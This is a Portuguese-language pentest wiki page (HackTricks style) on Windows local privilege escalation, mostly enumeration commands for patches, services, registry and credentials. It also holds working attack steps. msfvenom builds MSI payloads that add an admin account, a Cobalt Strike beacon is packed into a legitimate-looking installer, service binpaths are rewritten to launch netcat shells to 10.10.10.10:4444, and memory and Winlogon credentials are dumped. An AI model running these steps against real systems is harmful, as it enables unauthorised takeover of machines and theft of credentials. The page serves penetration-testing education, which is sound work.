# Escalação de Privilégios Locais no Windows

{{#include ../../banners/hacktricks-training.md}}

### **Melhor ferramenta para procurar vetores de escalonamento de privilégios locais no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Inicial do Windows

### Tokens de Acesso

**Se você não sabe o que são Tokens de Acesso do Windows, leia a página a seguir antes de continuar:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Verifique a página a seguir para mais informações sobre ACLs - DACLs/SACLs/ACEs:**

{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Níveis de Integridade

**Se você não sabe o que são níveis de integridade no Windows, deve ler a página a seguir antes de continuar:**

{{#ref}}
integrity-levels.md
{{#endref}}

## Controles de Segurança do Windows

Existem diferentes coisas no Windows que podem **impedir você de enumerar o sistema**, executar executáveis ou até mesmo **detectar suas atividades**. Você deve **ler** a **página** a seguir e **enumerar** todos esses **mecanismos** de **defesa** antes de começar a enumeração de escalonamento de privilégios:

{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informações do Sistema

### Enumeração de informações da versão

Verifique se a versão do Windows possui alguma vulnerabilidade conhecida (verifique também os patches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits de Versão

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para buscar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Este banco de dados possui mais de 4.700 vulnerabilidades de segurança, mostrando a **superfície de ataque massiva** que um ambiente Windows apresenta.

**No sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tem watson embutido)_

**Localmente com informações do sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositórios do Github de exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Alguma credencial/informação suculenta salva nas variáveis de ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Histórico do PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Arquivos de Transcrição do PowerShell

Você pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Registro de Módulo PowerShell

Detalhes das execuções do pipeline PowerShell são registrados, abrangendo comandos executados, invocações de comandos e partes de scripts. No entanto, detalhes completos da execução e resultados de saída podem não ser capturados.

Para habilitar isso, siga as instruções na seção "Arquivos de Transcrição" da documentação, optando por **"Registro de Módulo"** em vez de **"Transcrição do Powershell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver os últimos 15 eventos dos logs do PowersShell, você pode executar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Registro de Blocos de Script**

Um registro completo de atividades e do conteúdo total da execução do script é capturado, garantindo que cada bloco de código seja documentado à medida que é executado. Esse processo preserva um histórico de auditoria abrangente de cada atividade, valioso para investigações forenses e análise de comportamentos maliciosos. Ao documentar toda a atividade no momento da execução, são fornecidas informações detalhadas sobre o processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Os eventos de registro para o Script Block podem ser encontrados no Visualizador de Eventos do Windows no caminho: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Para visualizar os últimos 20 eventos, você pode usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configurações da Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Você pode comprometer o sistema se as atualizações não forem solicitadas usando http**S** mas http.

Você começa verificando se a rede usa uma atualização WSUS não SSL executando o seguinte:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Se você receber uma resposta como:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` for igual a `1`.

Então, **é explorável.** Se o último registro for igual a 0, a entrada do WSUS será ignorada.

Para explorar essas vulnerabilidades, você pode usar ferramentas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Esses são scripts de exploits armados MiTM para injetar atualizações 'falsas' no tráfego WSUS não SSL.

Leia a pesquisa aqui:

{% file src="../../images/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Leia o relatório completo aqui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basicamente, esta é a falha que esse bug explora:

> Se tivermos o poder de modificar nosso proxy de usuário local, e as Atualizações do Windows usam o proxy configurado nas configurações do Internet Explorer, portanto, temos o poder de executar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso próprio tráfego e executar código como um usuário elevado em nosso ativo.
>
> Além disso, uma vez que o serviço WSUS usa as configurações do usuário atual, ele também usará seu armazenamento de certificados. Se gerarmos um certificado autoassinado para o nome do host WSUS e adicionarmos esse certificado ao armazenamento de certificados do usuário atual, seremos capazes de interceptar tanto o tráfego WSUS HTTP quanto HTTPS. O WSUS não usa mecanismos semelhantes ao HSTS para implementar uma validação de confiança na primeira utilização no certificado. Se o certificado apresentado for confiável pelo usuário e tiver o nome do host correto, será aceito pelo serviço.

Você pode explorar essa vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (uma vez que seja liberada).

## KrbRelayUp

Uma vulnerabilidade de **elevação de privilégio local** existe em ambientes **de domínio** do Windows sob condições específicas. Essas condições incluem ambientes onde **a assinatura LDAP não é aplicada,** os usuários possuem direitos próprios que lhes permitem configurar **Delegação Constrangida Baseada em Recurso (RBCD),** e a capacidade de os usuários criarem computadores dentro do domínio. É importante notar que esses **requisitos** são atendidos usando **configurações padrão**.

Encontre o **exploit em** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Para mais informações sobre o fluxo do ataque, consulte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** esses 2 registros estiverem **ativados** (o valor é **0x1**), então usuários de qualquer privilégio podem **instalar** (executar) arquivos `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloads do Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se você tiver uma sessão meterpreter, pode automatizar essa técnica usando o módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar dentro do diretório atual um binário MSI do Windows para escalar privilégios. Este script gera um instalador MSI pré-compilado que solicita a adição de um usuário/grupo (portanto, você precisará de acesso GIU):
```
Write-UserAddMSI
```
Basta executar o binário criado para escalar privilégios.

### MSI Wrapper

Leia este tutorial para aprender como criar um wrapper MSI usando estas ferramentas. Note que você pode envolver um "**.bat**" se você **apenas** quiser **executar** **linhas de comando**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Criar MSI com WIX

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Criar MSI com Visual Studio

- **Gere** com Cobalt Strike ou Metasploit um **novo payload TCP EXE do Windows** em `C:\privesc\beacon.exe`
- Abra **Visual Studio**, selecione **Criar um novo projeto** e digite "installer" na caixa de pesquisa. Selecione o projeto **Setup Wizard** e clique em **Next**.
- Dê um nome ao projeto, como **AlwaysPrivesc**, use **`C:\privesc`** para o local, selecione **colocar solução e projeto no mesmo diretório**, e clique em **Create**.
- Continue clicando em **Next** até chegar ao passo 3 de 4 (escolher arquivos para incluir). Clique em **Add** e selecione o payload Beacon que você acabou de gerar. Em seguida, clique em **Finish**.
- Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e nas **Properties**, mude **TargetPlatform** de **x86** para **x64**.
- Existem outras propriedades que você pode alterar, como o **Author** e **Manufacturer**, que podem fazer o aplicativo instalado parecer mais legítimo.
- Clique com o botão direito no projeto e selecione **View > Custom Actions**.
- Clique com o botão direito em **Install** e selecione **Add Custom Action**.
- Clique duas vezes em **Application Folder**, selecione seu arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o payload beacon seja executado assim que o instalador for executado.
- Nas **Custom Action Properties**, mude **Run64Bit** para **True**.
- Finalmente, **construa-o**.
- Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for exibido, certifique-se de que você definiu a plataforma como x64.

### Instalação do MSI

Para executar a **instalação** do arquivo malicioso `.msi` em **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explorar essa vulnerabilidade, você pode usar: _exploit/windows/local/always_install_elevated_

## Antivirus e Detectores

### Configurações de Auditoria

Essas configurações decidem o que está sendo **registrado**, então você deve prestar atenção.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

O Windows Event Forwarding é interessante para saber para onde os logs são enviados.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** é projetado para o **gerenciamento de senhas de Administrador local**, garantindo que cada senha seja **única, aleatória e atualizada regularmente** em computadores conectados a um domínio. Essas senhas são armazenadas de forma segura no Active Directory e só podem ser acessadas por usuários que receberam permissões suficientes através de ACLs, permitindo que visualizem senhas de administrador local se autorizados.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se ativo, **senhas em texto simples são armazenadas no LSASS** (Local Security Authority Subsystem Service).\
[**Mais informações sobre WDigest nesta página**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Proteção LSA

A partir do **Windows 8.1**, a Microsoft introduziu uma proteção aprimorada para a Autoridade de Segurança Local (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, aumentando ainda mais a segurança do sistema.\
[**Mais informações sobre a Proteção LSA aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** foi introduzido no **Windows 10**. Seu objetivo é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash.| [**Mais informações sobre o Credentials Guard aqui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenciais em Cache

**Credenciais de domínio** são autenticadas pela **Autoridade de Segurança Local** (LSA) e utilizadas por componentes do sistema operacional. Quando os dados de logon de um usuário são autenticados por um pacote de segurança registrado, as credenciais de domínio para o usuário são tipicamente estabelecidas.\
[**Mais informações sobre Credenciais em Cache aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuários e Grupos

### Enumerar Usuários e Grupos

Você deve verificar se algum dos grupos aos quais você pertence possui permissões interessantes.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Se você **pertencer a algum grupo privilegiado, pode ser capaz de escalar privilégios**. Aprenda sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulação de tokens

**Saiba mais** sobre o que é um **token** nesta página: [**Tokens do Windows**](../authentication-credentials-uac-and-efs/#access-tokens).\
Verifique a página a seguir para **aprender sobre tokens interessantes** e como abusar deles:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Usuários logados / Sessões
```bash
qwinsta
klist sessions
```
### Pastas pessoais
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Política de Senhas
```bash
net accounts
```
### Obter o conteúdo da área de transferência
```bash
powershell -command "Get-Clipboard"
```
## Executando Processos

### Permissões de Arquivo e Pasta

Primeiro de tudo, listar os processos **verifica se há senhas dentro da linha de comando do processo**.\
Verifique se você pode **sobrescrever algum binário em execução** ou se você tem permissões de gravação na pasta do binário para explorar possíveis [**ataques de DLL Hijacking**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Sempre verifique se há possíveis [**depuradores electron/cef/chromium** em execução, você pode abusar disso para escalar privilégios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verificando permissões dos binários dos processos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verificando as permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mineração de Senhas na Memória

Você pode criar um despejo de memória de um processo em execução usando **procdump** do sysinternals. Serviços como FTP têm as **credenciais em texto claro na memória**, tente despejar a memória e ler as credenciais.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicativos GUI inseguros

**Aplicativos executando como SYSTEM podem permitir que um usuário inicie um CMD ou navegue por diretórios.**

Exemplo: "Ajuda e Suporte do Windows" (Windows + F1), pesquise por "prompt de comando", clique em "Clique para abrir o Prompt de Comando"

## Serviços

Obtenha uma lista de serviços:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissões

Você pode usar **sc** para obter informações de um serviço
```bash
sc qc <service_name>
```
É recomendável ter o binário **accesschk** do _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
É recomendável verificar se "Usuários Autenticados" podem modificar algum serviço:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Você pode baixar accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar serviço

Se você estiver recebendo este erro (por exemplo, com SSDPSRV):

_Erro do sistema 1058 ocorreu._\
&#xNAN;_&#x54;O serviço não pode ser iniciado, seja porque está desativado ou porque não possui dispositivos habilitados associados a ele._

Você pode habilitá-lo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Leve em consideração que o serviço upnphost depende do SSDPSRV para funcionar (para XP SP1)**

**Outra solução alternativa** para esse problema é executar:
```
sc.exe config usosvc start= auto
```
### **Modificar o caminho do binário do serviço**

No cenário em que o grupo "Usuários autenticados" possui **SERVICE_ALL_ACCESS** em um serviço, a modificação do binário executável do serviço é possível. Para modificar e executar **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar serviço
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Os privilégios podem ser elevados através de várias permissões:

- **SERVICE_CHANGE_CONFIG**: Permite a reconfiguração do binário do serviço.
- **WRITE_DAC**: Habilita a reconfiguração de permissões, levando à capacidade de alterar configurações de serviço.
- **WRITE_OWNER**: Permite a aquisição de propriedade e reconfiguração de permissões.
- **GENERIC_WRITE**: Herda a capacidade de alterar configurações de serviço.
- **GENERIC_ALL**: Também herda a capacidade de alterar configurações de serviço.

Para a detecção e exploração dessa vulnerabilidade, o _exploit/windows/local/service_permissions_ pode ser utilizado.

### Permissões fracas dos binários de serviços

**Verifique se você pode modificar o binário que é executado por um serviço** ou se você tem **permissões de escrita na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking/))**.**\
Você pode obter todos os binários que são executados por um serviço usando **wmic** (não no system32) e verificar suas permissões usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Você também pode usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Modificar permissões do registro de serviços

Você deve verificar se pode modificar qualquer registro de serviço.\
Você pode **verificar** suas **permissões** sobre um **registro** de serviço fazendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Deve-se verificar se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem permissões de `FullControl`. Se sim, o binário executado pelo serviço pode ser alterado.

Para mudar o caminho do binário executado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permissões AppendData/AddSubdirectory do registro de serviços

Se você tiver essa permissão sobre um registro, isso significa que **você pode criar sub-registros a partir deste**. No caso de serviços do Windows, isso é **suficiente para executar código arbitrário:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Caminhos de Serviço Não Entre Aspas

Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada final antes de um espaço.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_, o Windows tentará executar:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste todos os caminhos de serviço não entre aspas, excluindo aqueles que pertencem a serviços do Windows integrados:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Você pode detectar e explorar** essa vulnerabilidade com metasploit: `exploit/windows/local/trusted\_service\_path` Você pode criar manualmente um binário de serviço com metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ações de Recuperação

O Windows permite que os usuários especifiquem ações a serem tomadas se um serviço falhar. Este recurso pode ser configurado para apontar para um binário. Se este binário for substituível, a escalada de privilégios pode ser possível. Mais detalhes podem ser encontrados na [documentação oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicações

### Aplicações Instaladas

Verifique as **permissões dos binários** (talvez você possa sobrescrever um e escalar privilégios) e das **pastas** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissões de Escrita

Verifique se você pode modificar algum arquivo de configuração para ler algum arquivo especial ou se você pode modificar algum binário que será executado por uma conta de Administrador (schedtasks).

Uma maneira de encontrar permissões fracas de pastas/arquivos no sistema é fazendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Executar na inicialização

**Verifique se você pode sobrescrever algum registro ou binário que será executado por um usuário diferente.**\
**Leia** a **página seguinte** para saber mais sobre **locais de autorun interessantes para escalar privilégios**:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Procure por possíveis **drivers estranhos/vulneráveis de terceiros**.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Se você tiver **permissões de escrita dentro de uma pasta presente no PATH**, poderá ser capaz de sequestrar uma DLL carregada por um processo e **escalar privilégios**.

Verifique as permissões de todas as pastas dentro do PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para mais informações sobre como abusar dessa verificação:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Rede

### Compartilhamentos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Verifique se há outros computadores conhecidos codificados no arquivo hosts.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces de Rede e DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Portas Abertas

Verifique os **serviços restritos** do lado de fora
```bash
netstat -ano #Opened ports?
```
### Tabela de Roteamento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regras de Firewall

[**Verifique esta página para comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desligar, desligar...)**

Mais[ comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)

### Subsistema Windows para Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
O binário `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se você obtiver acesso como usuário root, pode escutar em qualquer porta (na primeira vez que você usar `nc.exe` para escutar em uma porta, ele perguntará via GUI se `nc` deve ser permitido pelo firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar facilmente o bash como root, você pode tentar `--default-user root`

Você pode explorar o sistema de arquivos `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciais do Windows

### Credenciais do Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
